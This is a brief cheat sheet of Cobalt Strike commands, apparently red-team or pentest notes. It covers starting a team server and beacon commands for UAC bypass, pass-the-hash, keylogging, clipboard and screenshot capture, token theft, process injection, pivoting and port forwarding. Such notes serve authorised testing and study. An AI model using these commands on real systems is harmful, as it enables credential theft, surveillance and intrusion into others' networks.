# Cobalt Strike

## Start Team Server

```
sudo ./teamserver <ip_server> <shared_pwd> <path_to_profile>
```

## Beacon cmd

### Set beacin sleep time

```
sleep <time_in_sec_ex>
```

### Try bypass UAC and elevate process

```
elevate uac-schtasks <process_name_beacon>
```

### Execute assembly

```
execute-assembly <local_path_to_exe> <argument>
```

### Execute command

```
run <cmd> <arg1>
```

### Upload file

```
upload <path_local_file>
```

### Periodic screenshot

```
screenwatch
```

### List jobs

```
jobs
```

### Kill jobs

```
jobkill <job_id>
```

### record keys

```
keylogger
```

### Copy clipboard

```
clipboard
```

### Path-the-hash and mimikatz to admin

```
pth <Domain>\<user> <hash>
```

### drop impersonation

```
rev2self
```

### Impersonate process and token

```
steal_token <PID>
```

### Make user token with password

```
make_token <Domain\user> <password>
```

### Store token

```
token-store steal <pid>
```

### Show token 

```
token-store show
```

### use stored token

```
token-store use <id>
```

### Inject beacon into process

```
inject <pid> <x64|x86> <listener_name>
```

### Connect to listening pivot

```
connect <target_ip_or_hostname> <port>
```

### Spawn new process and inject beacon

```
spawn <x64|x86> <listener>
```

### Proxy socks4

```
socks <port|1080>
```

### Proxy socks5 with auth

```
socks 1080 socks5 disableNoAuth <user> <pass> enableLogging
```

### Rerverse port forwarding

```
rportfwd <local_port> <127.0.0.1> <port_forward>
```
### Change spawnto

```
spawnto x<64|86> %windir%\sysnative\dllhost.exe
```